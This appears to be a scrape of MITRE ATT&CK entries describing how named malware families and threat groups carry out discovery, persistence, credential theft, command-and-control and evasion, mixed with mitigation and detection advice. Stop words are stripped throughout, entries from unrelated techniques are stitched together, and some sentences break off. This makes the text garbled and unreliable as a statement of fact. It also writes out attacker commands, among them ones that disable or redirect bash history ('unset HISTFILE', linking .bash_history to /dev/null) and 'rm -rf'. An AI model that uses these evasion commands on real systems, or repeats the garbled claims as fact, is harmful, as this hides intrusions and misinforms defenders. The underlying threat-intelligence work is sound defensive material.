 [Kwampirs](https://attack.mitre.org/software/S0236) collects OS version registered owner details, manufacturer details, processor type, storage, installed patches, hostname, version info, date, commands <code>systeminfo</code>, <code>net config workstation</code>, <code>hostname</code>, <code>ver</code>, <code>set</code>, <code>date /t</code>.(Citation: Symantec Orangeworm April 2018) Enforce registration execution legitimately signed service drivers possible. [FIN4](https://attack.mitre.org/groups/G0085) spearphishing emails (often compromised accounts) malicious links.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) [Industroyer](https://attack.mitre.org/software/S0604)’s main backdoor connected remote C2 server HTTPS.(Citation: ESET Industroyer) Prevent credential overlap systems administrator privileged accounts.(Citation: FireEye WMI 2015) [QakBot](https://attack.mitre.org/software/S0650) dropper delay dropping payload evade detection.(Citation: Cyberint Qakbot 2021)(Citation: Kaspersky QakBot September 2021) [Net Crawler](https://attack.mitre.org/software/S0056) credential dumpers [Mimikatz](https://attack.mitre.org/software/S0002) [Windows Credential Editor](https://attack.mitre.org/software/S0005) extract cached credentials Windows systems.(Citation: Cylance Cleaver) Windows 10, Attack Surface Reduction (ASR) rules enabled prevent execution malicious executable files (such downloaded executed Office applications/scripting interpreters/email clients meet specific prevalence, age, trusted list criteria). Note: cloud-delivered protection enabled rules. (Citation: win10_asr) [Mosquito](https://attack.mitre.org/software/S0256) <code>ipconfig</code> command.(Citation: ESET Turla Mosquito Jan 2018) [RedLeaves](https://attack.mitre.org/software/S0153) gather extended including hostname, OS version number, platform, memory information, time elapsed startup, CPU information.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Accenture Hogfish April 2018) (Citation: Symantec Orangeworm April 2018) [HermeticWizard](https://attack.mitre.org/software/S0698) files machines compromised network.(Citation: ESET Hermetic Wizard March 2022) [Earth Lusca](https://attack.mitre.org/groups/G1006) acquired variety source tools.(Citation: TrendMicro EarthLusca 2022) [RDAT](https://attack.mitre.org/software/S0495) upload file POST response C2 split 102,400-byte portions. [RDAT](https://attack.mitre.org/software/S0495) download data C2 split 81,920-byte portions.(Citation: Unit42 RDAT July 2020)	 [menuPass](https://attack.mitre.org/groups/G0045) script (atexec.py) execute command target machine Task Scheduler.(Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: Secureworks GOLD KINGSWOOD September 2018) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors collected data compromised hosts.(Citation: McAfee Honeybee) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors renamed tools executables legitimate programs.(Citation: FoxIT Wocao December 2019) [REvil](https://attack.mitre.org/software/S0496) download attacker controlled IP address victim machine.(Citation: Talos Sodinokibi April 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Picus Sodinokibi January 2020) (Citation: CrowdStrike Ember Bear Profile March 2022)(Citation: Mandiant UNC2589 March 2022) [APT3](https://attack.mitre.org/groups/G0022) replaces Sticky binary <code>C:\Windows\System32\sethc.exe</code> persistence.(Citation: aptsim) [Conti](https://attack.mitre.org/software/S0575) enumerate routine network connections compromised host.(Citation: CarbonBlack Conti July 2020) [APT32](https://attack.mitre.org/groups/G0050)'s backdoor possesses capability list files directories machine. (Citation: ESET OceanLotus Mar 2019)	
 [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors installed DLLs backdoors Windows services.(Citation: McAfee Honeybee) [Carbon](https://attack.mitre.org/software/S0335) <code>net view</code> command.(Citation: GovCERT Carbon 2016) [Proton](https://attack.mitre.org/software/S0279) gathers credentials files 1password.(Citation: objsee mac malware 2017) [HELLOKITTY](https://attack.mitre.org/software/S0617) search specific processes terminate.(Citation: FireEye FiveHands April 2021) [CosmicDuke](https://attack.mitre.org/software/S0050) HTTPS command control hard-coded C2 servers.(Citation: F-Secure Dukes)(Citation: F-Secure Cosmicduke) [PipeMon](https://attack.mitre.org/software/S0501) parent PID spoofing elevate privileges.(Citation: ESET PipeMon 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) <code>hidcon</code> batch files hidden console window.(Citation: Unit 42 Gamaredon February 2022) [Mongall](https://attack.mitre.org/software/S1026) Base64 encode C2.(Citation: SentinelOne Aoqin Dragon June 2022) [JSS Loader](https://attack.mitre.org/software/S0648) delivered phishing emails malicious Excel attachments.(Citation: eSentire FIN7 July 2021) Monitor executed commands arguments gain persistence elevate privileges executing malicious content triggered Event Monitor Daemon (emond). [CharmPower](https://attack.mitre.org/software/S0674) download additional modules actor-controlled Amazon S3 buckets.(Citation: Check APT35 CharmPower January 2022) [Gold Dragon](https://attack.mitre.org/software/S0249) terminates anti-malware processes they’re running system.(Citation: McAfee Gold Dragon) [Zeus Panda](https://attack.mitre.org/software/S0330) modifies Registry <code>HKCU\Software\Microsoft\Internet Explorer\ PhishingFilter\</code> disable phishing filters.(Citation: GDATA Zeus Panda June 2017) [TA505](https://attack.mitre.org/groups/G0092) TinyMet enumerate privileged groups.(Citation: IBM TA505 April 2020) [TA505](https://attack.mitre.org/groups/G0092) <code>net /domain</code>.(Citation: Trend Micro TA505 June 2019) [gh0st RAT](https://attack.mitre.org/software/S0032) create service establish persistence.(Citation: Nccgroup Gh0st April 2018)(Citation: Gh0stRAT ATT March 2019) [APT37](https://attack.mitre.org/groups/G0067)'s Freenki malware lists running processes Windows API.(Citation: Talos Group123) Monitor windows registry values attempt hide artifacts behaviors evade detection. [Pupy](https://attack.mitre.org/software/S0192) sniff plaintext network credentials NBNS Spoofing poison services.(Citation: GitHub Pupy) Malware [Group5](https://attack.mitre.org/groups/G0043) capable remotely deleting files victims.(Citation: Citizen Lab Group5) [Carbanak](https://attack.mitre.org/software/S0030) encrypts message body traffic RC2 (in CBC mode). [Carbanak](https://attack.mitre.org/software/S0030) XOR random communications.(Citation: Kaspersky Carbanak)(Citation: FireEye CARBANAK June 2017) [Carbon](https://attack.mitre.org/software/S0335) C2 communications.(Citation: Accenture HyperStack October 2020) [Dok](https://attack.mitre.org/software/S0281) downloads installs [Tor](https://attack.mitre.org/software/S0183) homebrew.(Citation: objsee mac malware 2017) [Calisto](https://attack.mitre.org/software/S0274) capability <code>rm -rf</code> remove folders files victim's machine.(Citation: Securelist Calisto July 2018) [Silence](https://attack.mitre.org/groups/G0091) Farse6.1 utility (based [Mimikatz](https://attack.mitre.org/software/S0002)) extract credentials lsass.exe.(Citation: IB Silence Sept 2018) [Flagpro](https://attack.mitre.org/software/S0696) execute `net view` discover mapped network shares.(Citation: NTT Security Flagpro December 2021) [Lokibot](https://attack.mitre.org/software/S0447) ability discover Windows product name/version.(Citation: FSecure Lokibot November 2019) [Attor](https://attack.mitre.org/software/S0438)'s plugins collect user credentials capturing keystrokes capture keystrokes pressed window injected process.(Citation: ESET Attor Oct 2019) browser pivoting requires integrity process launch from, restricting user permissions addressing Privilege Escalation [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) opportunities limit exposure technique. [Bundlore](https://attack.mitre.org/software/S0482) persist LaunchDaemon.(Citation: MacKeeper Bundlore Apr 2019) Monitor newly constructed active directory objects, Windows EID 5137. [ZIRCONIUM](https://attack.mitre.org/groups/G0128) exfiltrated stolen data Dropbox.(Citation: Zscaler APT31 Covid-19 October 2020) [Netwalker](https://attack.mitre.org/software/S0457) Windows API functions inject ransomware DLL.(Citation: TrendMicro Netwalker 2020) (Citation: TrendMicro POWERSTATS V3 June 2019)(Citation: Symantec MuddyWater Dec 2018) application control appropriate. [MESSAGETAP](https://attack.mitre.org/software/S0443) stored targeted SMS messages matched target list CSV files compromised system.(Citation: FireEye MESSAGETAP October 2019) [EKANS](https://attack.mitre.org/software/S0605) stops processes security management software.(Citation: Dragos EKANS)(Citation: FireEye Ransomware Feb 2020) [NotPetya](https://attack.mitre.org/software/S0368) reboot hour infection.(Citation: Talos Nyetya June 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020) Disable Bluetooth local security settings policy environment. [OutSteel](https://attack.mitre.org/software/S1017) relied user execute malicious attachment delivered spearphishing.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Sibot](https://attack.mitre.org/software/S0589) executes commands VBScript.(Citation: MSTIC NOBELIUM Mar 2021)	 infrastructure patterns tooling identified, internet scanning uncover adversary staged tools accessible targeting.
Much activity visibility target organization, detection behavior difficult. Detection efforts focused post-compromise phases adversary lifecycle, [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105). user admin domain accounts local administrator systems tightly controlled, equivalent local administrator account password systems. Follow practices design administration enterprise network limit privileged account administrative tiers. [APT29](https://attack.mitre.org/groups/G0016) created tokens compromised SAML signing certificates.(Citation: - Customer Guidance Nation-State Cyber Attacks)(Citation: Secureworks IRON RITUAL Profile) [ZxShell](https://attack.mitre.org/software/S0412) command called RunAs, creates process user process context.(Citation: Talos ZxShell Oct 2014)  [Sandworm Team](https://attack.mitre.org/groups/G0034) <code>sp_addlinkedsrvlogin</code> command MS-SQL create link created account servers network.(Citation: Dragos Crashoverride 2018) [Molerats](https://attack.mitre.org/groups/G0021) saved malicious files AppData Startup folders maintain persistence.(Citation: Kaspersky MoleRATs April 2019) [QakBot](https://attack.mitre.org/software/S0650) ability download additional components malware.(Citation: Trend Micro Qakbot 2020)(Citation: Crowdstrike Qakbot October 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Cyberint Qakbot 2021)(Citation: Kaspersky QakBot September 2021)(Citation: IB Ransomware September 2020) [Cyclops Blink](https://attack.mitre.org/software/S0687) [Tor](https://attack.mitre.org/software/S0183) nodes C2 traffic.(Citation: NCSC CISA Cyclops Blink Advisory February 2022) (Citation: Crowdstrike Indrik November 2018)(Citation: Crowdstrike EvilCorp March 2021)(Citation: Treasury EvilCorp Dec 2019) [xCaon](https://attack.mitre.org/software/S0653) encrypted data C2 server XOR key.(Citation: Checkpoint IndigoZebra July 2021)  [APT-C-36](https://attack.mitre.org/groups/G0099) macro function set scheduled tasks, disguised Google.(Citation: QiAnXin APT-C-36 Feb2019) [DarkWatchman](https://attack.mitre.org/software/S0673) WMI execute commands.(Citation: Prevailion DarkWatchman 2021) [DanBot](https://attack.mitre.org/software/S1014) ability execute arbitrary commands `cmd.exe`.(Citation: SecureWorks August 2019)(Citation: ClearSky Siamesekitten August 2021) [GALLIUM](https://attack.mitre.org/groups/G0093) <code>whoami</code> <code>query user</code> victim user.(Citation: Cybereason Soft Cell June 2019) [Emotet](https://attack.mitre.org/software/S0367) observed hook network APIs monitor network traffic. (Citation: Trend Micro Banking Malware Jan 2019) [APT33](https://attack.mitre.org/groups/G0064) leveraged publicly-available tools intrusion activities.(Citation: FireEye APT33 Guardrail)(Citation: Symantec Elfin Mar 2019) (Citation: SecureWorks August 2019) Monitor process API calls <code>AddMonitor</code>.(Citation: AddMonitor) [ZxShell](https://attack.mitre.org/software/S0412) command perform video device spying.(Citation: Talos ZxShell Oct 2014)  Monitor newly constructed drive letters mount data storage device attempts write sensitive locations partition boot sector, master boot record, disk partition table, BIOS parameter block/superblock. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-Kerberoast</code> module request service tickets return crackable ticket hashes.(Citation: PowerSploit Invoke Kerberoast)(Citation: Harmj0y Kerberoast Nov 2016) [Koadic](https://attack.mitre.org/software/S0250) command machine [PsExec](https://attack.mitre.org/software/S0029).(Citation: Github Koadic) [Lizar](https://attack.mitre.org/software/S0681) collect machine,.(Citation: BiZone Lizar 2021)  Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Volatile Cedar](https://attack.mitre.org/groups/G0123) deploy additional tools.(Citation: ClearSky Lebanese Cedar Jan 2021) [POWRUNER](https://attack.mitre.org/software/S0184) execute commands C2 server.(Citation: FireEye APT34 Dec 2017) [NETWIRE](https://attack.mitre.org/software/S0198) launch hidden folders.(Citation: Red Canary NETWIRE January 2020) [Imminent Monitor](https://attack.mitre.org/software/S0434) uploaded file debugger logs, network C2.(Citation: QiAnXin APT-C-36 Feb2019) [NotPetya](https://attack.mitre.org/software/S0368) encrypts user files disk structures MBR 2048-bit RSA.(Citation: Talos Nyetya June 2017)(Citation: US-CERT NotPetya 2017)(Citation: District Court Indictment GRU Unit 74455 October 2020) [Carbon](https://attack.mitre.org/software/S0335) encrypts configuration files tasks malware complete CAST-128 algorithm.(Citation: ESET Carbon Mar 2017)(Citation: Accenture HyperStack October 2020) [Hi-Zor](https://attack.mitre.org/software/S0087) ability create reverse shell.(Citation: Fidelis INOCNATION) [NanHaiShu](https://attack.mitre.org/software/S0228) mshta.exe load program files.(Citation: fsecure NanHaiShu July 2016) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Hikit](https://attack.mitre.org/software/S0009) [Rootkit](https://attack.mitre.org/techniques/T1014) [Axiom](https://attack.mitre.org/groups/G0001).(Citation: FireEye Hikit Rootkit) (Citation: FireEye HIKIT Rootkit 2)  [BADFLICK](https://attack.mitre.org/software/S0642) uploaded files victims' machines.(Citation: Accenture MUDCARP March 2019) [RTM](https://attack.mitre.org/software/S0148) victim username permissions.(Citation: ESET RTM Feb 2017) [Carbanak](https://attack.mitre.org/groups/G0008) malware installs service provide persistence privileges.(Citation: Kaspersky Carbanak) Monitor analyze traffic patterns packet inspection web-based network connections malicious suspicious detinations (e.g. destinations attributed phishing campaigns). correlation process monitoring command detect anomalous processes execution command arguments (e.g. monitor anomalies files initiate network connections unusual connections initiated regsvr32.exe, rundll.exe, .SCF, HTA, MSI, DLLs, msiexec.exe). [UNC2452](https://attack.mitre.org/groups/G0118) <code>scheduler</code> <code>schtasks</code> create tasks remote hosts lateral movement.(Citation: Volexity SolarWinds) manipulated scheduled tasks updating existing legitimate task execute tools returned scheduled task original configuration.(Citation: FireEye SUNBURST Backdoor December 2020) [UNC2452](https://attack.mitre.org/groups/G0118) created scheduled task maintain [SUNSPOT](https://attack.mitre.org/software/S0562) persistence host booted.(Citation: CrowdStrike SUNSPOT Implant January 2021)  [Explosive](https://attack.mitre.org/software/S0569) communication.(Citation: CheckPoint Volatile Cedar March 2015) Application developers uploading public code repositories careful avoid publishing sensitive credentials API keys. [NanHaiShu](https://attack.mitre.org/software/S0228) DNS C2 communications.(Citation: fsecure NanHaiShu July 2016) analyzing malware features malware providers, compiler used, debugging artifacts, code similarities, identifiers specific MaaS offerings. Malware repositories identify additional samples developers adversary utilizing services. Identifying overlaps malware adversaries malware adversary developed them. cases, identifying overlapping characteristics malware adversaries shared quartermaster.(Citation: FireEyeSupplyChain) [Earth Lusca](https://attack.mitre.org/groups/G1006) [Tasklist](https://attack.mitre.org/software/S0057) compromised host.(Citation: TrendMicro EarthLusca 2022) modifying SAML responses include custom elements service provider. Monitor custom elements service provider access logs detect anomalous requests.(Citation: Sygnia Golden SAML) [Andariel](https://attack.mitre.org/groups/G0138) variety publicly-available remote access Trojans (RATs) operations.(Citation: FSI Andariel Campaign Rifle July 2017) [PowerShower](https://attack.mitre.org/software/S0441) ability identify current Windows domain infected host.(Citation: Kaspersky Cloud Atlas August 2019) Monitor files configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. [Sibot](https://attack.mitre.org/software/S0589) decrypt data received C2 save file.(Citation: MSTIC NOBELIUM Mar 2021) [Penquin](https://attack.mitre.org/software/S0587) remove strings binaries.(Citation: Leonardo Turla Penquin 2020) [Sidewinder](https://attack.mitre.org/groups/G0121) tools enumerate software installed infected host.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020) [Deep Panda](https://attack.mitre.org/groups/G0009) sticky-keys technique bypass RDP login screen remote systems intrusions.(Citation: RSA Crew) Monitor windows registry deleted alter generated artifacts persistence host system.  [Brave Prince](https://attack.mitre.org/software/S0252) gathers Registry.(Citation: McAfee Gold Dragon) [Kinsing](https://attack.mitre.org/software/S0599) script parse files <code>/etc/hosts</code> SSH <code>known_hosts</code> discover remote systems.(Citation: Aqua Kinsing April 2020) Monitor newly constructed files amounts data. Abnormal file sizes indicator embedded content. [OSInfo](https://attack.mitre.org/software/S0165) enumerates local domain users(Citation: Symantec Buckeye) [Exaramel Windows](https://attack.mitre.org/software/S0343) adds configuration Registry XML format.(Citation: ESET TeleBots Oct 2018) Monitor API calls gathering registered local services, QueryServiceStatusEx. [CharmPower](https://attack.mitre.org/software/S0674) collect data files compromised host.(Citation: Check APT35 CharmPower January 2022) [Mustang Panda](https://attack.mitre.org/groups/G0129) searched entire target DOC, DOCX, PPT, PPTX, XLS, XLSX, PDF files.(Citation: Avira Mustang Panda January 2020) [RCSession](https://attack.mitre.org/software/S0662) ability modify Registry key establish persistence.(Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020) [PoetRAT](https://attack.mitre.org/software/S0428) ability list running processes.(Citation: Talos PoetRAT April 2020) [Pasam](https://attack.mitre.org/software/S0208) creates backdoor remote attackers retrieve lists files.(Citation: Symantec Pasam 2012) applications hashes. [gh0st RAT](https://attack.mitre.org/software/S0032) Registry key establish persistence.(Citation: Nccgroup Gh0st April 2018)(Citation: Gh0stRAT ATT March 2019) [BabyShark](https://attack.mitre.org/software/S0414) Registry key ensure future macros enabled Word Excel additional persistence.(Citation: Unit42 BabyShark Feb 2019)(Citation: CISA AA20-301A Kimsuky) [ObliqueRAT](https://attack.mitre.org/software/S0644) ability extract data removable devices connected endpoint.(Citation: Talos Oblique RAT March 2021) [NotPetya](https://attack.mitre.org/software/S0368) drops [PsExec](https://attack.mitre.org/software/S0029) filename dllhost.dat.(Citation: Talos Nyetya June 2017) [DarkHydrus](https://attack.mitre.org/groups/G0079) <code>-WindowStyle Hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) windows. (Citation: Unit 42 DarkHydrus July 2018) [InvisiMole](https://attack.mitre.org/software/S0260) command list account victim’s machine.(Citation: ESET InvisiMole June 2018) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363) automatically gather username, domain name, machine name, information.(Citation: Talos Frankenstein June 2019) [LiteDuke](https://attack.mitre.org/software/S0513) wait 30 executing additional code security software detected.(Citation: ESET Dukes October 2019) [WhisperGate](https://attack.mitre.org/software/S0689) `cmd.exe` execute commands.(Citation: Unit 42 WhisperGate January 2022) [ServHelper](https://attack.mitre.org/software/S0382) attempt enumerate username victim.(Citation: Proofpoint TA505 Jan 2019) [APT29](https://attack.mitre.org/groups/G0016) WMI steal credentials execute backdoors future time.(Citation: Mandiant Easy Breach) WMI remote execution files lateral movement.(Citation: 365 Defender Solorigate)(Citation: Deep Dive Solorigate January 2021) [SpicyOmelette](https://attack.mitre.org/software/S0646) ability execute arbitrary JavaScript code compromised host.(Citation: Secureworks GOLD KINGSWOOD September 2018) [Ursnif](https://attack.mitre.org/software/S0386) DGA generate domain names C2.(Citation: ProofPoint Ursnif Aug 2016) [FELIXROOT](https://attack.mitre.org/software/S0267) encrypts collected data AES Base64 sends C2 server.(Citation: FireEye FELIXROOT July 2018) (Citation: Anomali Static Kitten February 2021)(Citation: Tetra Defense Sodinokibi March 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors PowerShell add delete rules Windows firewall.(Citation: FoxIT Wocao December 2019) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060)'s MSGET downloader dead drop resolver access malicious payloads.(Citation: Secureworks BRONZE BUTLER Oct 2017) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SierraAlfa sends data hard-coded C2 servers chosen random, transmission fails, chooses C2 server attempt transmission again.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) [Threat Group-3390](https://attack.mitre.org/groups/G0027) actors VPN profiles operation access network external VPN services.(Citation: Dell TG-3390) [Threat Group-3390](https://attack.mitre.org/groups/G0027) OWA account credentials intrusions subsequently attempt regain access evicted victim network.(Citation: SecureWorks BRONZE UNION June 2017) [Ke3chang](https://attack.mitre.org/groups/G0004) compress data exfiltration.(Citation: Mandiant Operation Ke3chang November 2014) [HTTPBrowser](https://attack.mitre.org/software/S0070) capable capturing keystrokes victims.(Citation: Dell TG-3390) (Citation: Mandiant FIN5 GrrCON Oct 2016) multiple methods preventing user's command history flushed .bash_history file, including commands:
<code>set +o history</code> <code>set -o history</code> start logging again;
<code>unset HISTFILE</code> user's .bash_rc file; and
<code>ln -s /dev/null ~/.bash_history</code> write commands <code>/dev/null</code>instead. [Lokibot](https://attack.mitre.org/software/S0447) LoadLibrary(), GetProcAddress() CreateRemoteThread() API functions execute shellcode.(Citation: Talos Lokibot Jan 2021) [ABK](https://attack.mitre.org/software/S0469) extract malicious Portable Executable (PE) photo.(Citation: Trend Micro Tick November 2019) [Cyclops Blink](https://attack.mitre.org/software/S0687) ability create pipe enable inter-process communication.(Citation: Trend Micro Cyclops Blink March 2022) [WarzoneRAT](https://attack.mitre.org/software/S0670) access webcam victim's machine.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors disguised executables JPG files.(Citation: Cylance Dust Storm)  Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature block methods rundll32.exe bypass whitelisting. (Citation: Secure Host Baseline EMET) Monitor established network communications anomalous IPs environment download malicious code. Restrict read/write access systemd unit files select privileged users legitimate manage services. [RemoteCMD](https://attack.mitre.org/software/S0166) execute commands remotely creating schedule task remote system(Citation: Symantec Buckeye) (Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021) (Citation: McAfee Honeybee)  [Green Lambert](https://attack.mitre.org/software/S0690) scripts execution, <code>/bin/sh -c</code>.(Citation: Objective Green Lambert OSX Oct 2021)(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021)  [WastedLocker](https://attack.mitre.org/software/S0612)'s custom crypter, CryptOne, leveraged VirtualAlloc() API function execute payload.(Citation: NCC WastedLocker June 2020) [HermeticWiper](https://attack.mitre.org/software/S0697) `postgressql.exe` mask malicious payload.(Citation: ESET Hermetic Wizard March 2022) [ZxShell](https://attack.mitre.org/software/S0412) rundll32.exe execute DLLs named pipes.(Citation: Talos ZxShell Oct 2014)  [RDAT](https://attack.mitre.org/software/S0495) download files DNS.(Citation: Unit42 RDAT July 2020)	 [Proton](https://attack.mitre.org/software/S0279) removes logs <code>/var/logs</code> <code>/Library/logs</code>.(Citation: objsee mac malware 2017) [Blue Mockingbird](https://attack.mitre.org/groups/G0108) Remote Desktop log servers interactively manually files remote hosts.(Citation: RedCanary Mockingbird 2020) [UNC2452](https://attack.mitre.org/groups/G0118) extracted files compromised networks.(Citation: Volexity SolarWinds)  [SideTwist](https://attack.mitre.org/software/S0610) port 443 C2 port 80 fallback.(Citation: Check APT34 April 2021) [Kwampirs](https://attack.mitre.org/software/S0236) establishes persistence adding service display "WMI Performance Adapter Extension" attempt masquerade legitimate WMI service.(Citation: Symantec Orangeworm April 2018) (Citation: Cisco 72)(Citation: Novetta-Axiom) Preemptively search files passwords credentials actions reduce exposure risk found. [Astaroth](https://attack.mitre.org/software/S0373) external software NetPass recover passwords. (Citation: Cybereason Astaroth Feb 2019) [NativeZone](https://attack.mitre.org/software/S0637) decrypt decode embedded  [Cobalt Strike](https://attack.mitre.org/software/S0154) beacon stage shellcode.(Citation: MSTIC Nobelium Toolset 2021) [Pillowmint](https://attack.mitre.org/software/S0517) decompressed included shellcode prior launched.(Citation: Trustwave Pillowmint June 2020)	 [S-Type](https://attack.mitre.org/software/S0085) runs command <code>net start</code> victim.(Citation: Cylance Dust Storm) Collect file hashes; file names match expected hash suspect. Perform file monitoring; files names unusual locations suspect. indications common characters attempt trick users misidentifying file type, space character file right-to-left override characters"\u202E", "[U+202E]", "%E2%80%AE”. [yty](https://attack.mitre.org/software/S0248) gathers name, serial main disk volume, CPU information, Windows version, runs command <code>systeminfo</code>.(Citation: ASERT Donot March 2018) [Okrum](https://attack.mitre.org/software/S0439) AES encrypt network traffic. key hardcoded negotiated C2 server registration phase. (Citation: ESET Okrum July 2019) [Kazuar](https://attack.mitre.org/software/S0265) HTTPS communicate C2 server. [Kazuar](https://attack.mitre.org/software/S0265) webserver listen inbound requests exposed API.(Citation: Unit 42 Kazuar 2017) [Mis-Type](https://attack.mitre.org/software/S0084) collected files data compromised host.(Citation: Cylance Dust Storm) [LightNeuron](https://attack.mitre.org/software/S0395) capable starting process CreateProcess.(Citation: ESET LightNeuron 2019) MMC environment administrators, regular users clients.  [GrimAgent](https://attack.mitre.org/software/S0632) <code>Accept-Language</code> identify hosts United Kingdom, United States, France, Spain.(Citation: IB GrimAgent July 2021)  identifying compromised network device bridge network boundary, block malicious packets unaffected network device path, firewall router compromised.  Continue monitor additional activity ensure blocks effective. [Gallmaker](https://attack.mitre.org/groups/G0084) PowerShell download additional payloads execution.(Citation: Symantec Gallmaker Oct 2018) [GrimAgent](https://attack.mitre.org/software/S0632) sleep 195 - 205 payload execution deleting task.(Citation: IB GrimAgent July 2021) [Ngrok](https://attack.mitre.org/software/S0508) threat actors configure servers data exfiltration.(Citation: MalwareBytes Ngrok February 2020) [Mongall](https://attack.mitre.org/software/S1026) download files targeted systems.(Citation: SentinelOne Aoqin Dragon June 2022) [NETWIRE](https://attack.mitre.org/software/S0198) discover close windows controlled systems.(Citation: Red Canary NETWIRE January 2020) [Ajax Security Team](https://attack.mitre.org/groups/G0130) FireMalv custom-developed malware, collected passwords Firefox browser storage.(Citation: Check Rocket Kitten) [Empire](https://attack.mitre.org/software/S0363) modules executing scripts.(Citation: Github PowerShell Empire) [SamSam](https://attack.mitre.org/software/S0370) encrypts victim files RSA-2048 encryption demands ransom paid Bitcoin decrypt files.(Citation: Sophos SamSam Apr 2018) [Mustang Panda](https://attack.mitre.org/groups/G0129) searched victim <code>InstallUtil.exe</code> program version.(Citation: Anomali MUSTANG PANDA October 2019) Virtualization, sandbox, user activity, discovery techniques occur steps operation occur adversary learns environment. Data events viewed isolation, chain behavior lead activities, lateral movement, based obtained. Detecting actions virtualization sandbox identification difficult depending adversary's implementation monitoring required. Monitoring suspicious processes spawned gather variety perform forms Discovery, short period time, aid detection. [Psylo](https://attack.mitre.org/software/S0078) exfiltrates data C2 server protocol C2 communications.(Citation: Scarlet Mimic Jan 2016) Monitor unexpected interactions <code>termsrv.dll</code>, typically stored <code>%SystemRoot%\System32\</code>. [ftp](https://attack.mitre.org/software/S0095) exfiltrate data separate main command control protocol.(Citation: FTP)(Citation: Linux FTP) [jRAT](https://attack.mitre.org/software/S0283) capture clipboard data.(Citation: Kaspersky Adwind Feb 2016) [UNC2452](https://attack.mitre.org/groups/G0118) set hostnames C2 infrastructure match legitimate hostnames victim environment. IP addresses originating country victim VPN infrastructure.(Citation: FireEye SUNBURST Backdoor December 2020) [ServHelper](https://attack.mitre.org/software/S0382) module downloading executing DLLs leverages <code>rundll32.exe</code>.(Citation: Deep Instinct TA505 Apr 2019) Routinely check user permissions ensure expected users capability create instances. [Lazarus Group](https://attack.mitre.org/groups/G0032) shellcode macros decrypt manually map DLLs shellcode memory runtime.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) Disable unnecessary metadata services restrict disable insecure versions metadata services prevent adversary access.(Citation: Amazon AWS IMDS V2) [Empire](https://attack.mitre.org/software/S0363) Dropbox GitHub C2.(Citation: Github PowerShell Empire) [More_eggs](https://attack.mitre.org/software/S0284) basE91 encoding, encryption, C2 communication.(Citation: Security Intelligence Eggs Aug 2019) [Hildegard](https://attack.mitre.org/software/S0601) decrypted ELF files AES.(Citation: Unit 42 Hildegard Malware) Proactively search credentials Registry attempt remediate risk. C# implementation  [CharmPower](https://attack.mitre.org/software/S0674) command execution module <code>cmd</code>.(Citation: Check APT35 CharmPower January 2022) [CreepyDrive](https://attack.mitre.org/software/S1023) download files compromised host.(Citation: POLONIUM June 2022) [Mustang Panda](https://attack.mitre.org/groups/G0129) acquired C2 domains prior operations.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Recorded Future REDDELTA July 2020)(Citation: McAfee Dianxun March 2021) [Mythic](https://attack.mitre.org/software/S0699) supports custom chunk sizes upload/download files.(Citation: Mythc Documentation)	 [Diavol](https://attack.mitre.org/software/S0659) Base64 encoded RSA public key encrypting files.(Citation: Fortinet Diavol July 2021) (Citation: FireEye APT41 Aug 2019) [APT28](https://attack.mitre.org/groups/G0007) attempted users Office attachments malicious macro scripts.(Citation: Unit 42 Sofacy Feb 2018)(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Bankshot](https://attack.mitre.org/software/S0239) gathers domain account names/information process monitoring.(Citation: McAfee Bankshot) Monitor executed commands arguments arguments actions collect combine files. Remote access tools built-in features interact Windows API gather location. Data acquired staged Windows management tools Windows Management Instrumentation PowerShell. Monitor newly constructed drive letters mount data storage device attempts write sensitive locations partition boot sector, master boot record, disk partition table, BIOS parameter block/superblock. [SUNBURST](https://attack.mitre.org/software/S0559) masqueraded network traffic Orion Improvement Program (OIP) protocol.(Citation: FireEye SUNBURST Backdoor December 2020) [Mivast](https://attack.mitre.org/software/S0080) capability gather NTLM password information.(Citation: Symantec Backdoor.Mivast) [KGH_SPY](https://attack.mitre.org/software/S0526) harvest data mail clients.(Citation: Cybereason Kimsuky November 2020) [RainyDay](https://attack.mitre.org/software/S0629) ability capture screenshots.(Citation: Bitdefender Naikon April 2021) [Mustang Panda](https://attack.mitre.org/groups/G0129) legitimately signed executable execute malicious payload DLL file.(Citation: Anomali MUSTANG PANDA October 2019)(Citation: Recorded Future REDDELTA July 2020)(Citation: Proofpoint TA416 November 2020) [GrimAgent](https://attack.mitre.org/software/S0632) identify country code 